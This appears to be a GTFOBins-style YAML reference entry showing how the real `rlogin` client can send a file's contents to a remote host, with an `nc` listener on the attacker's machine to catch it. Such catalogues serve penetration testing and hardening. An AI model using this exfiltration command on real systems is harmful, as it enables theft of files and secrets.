---
description: |
  Usually `rlogin` is a symlink to `ssh`, the following works only when the *real* `rlogin` is used (e.g., from the `rsh-client` APT package).
functions:
  file-upload:
    - description: |
        Send contents of a file to a TCP port. Run `nc -l -p 4444 > "file_to_save"` on the attacker system to capture the contents.

        `rlogin` hangs waiting for the remote peer to close the socket.

        The file is corrupted by leading and trailing spurious data.
      code: |
        rlogin -l "$(cat $LFILE)" -p $RPORT $RHOST
---
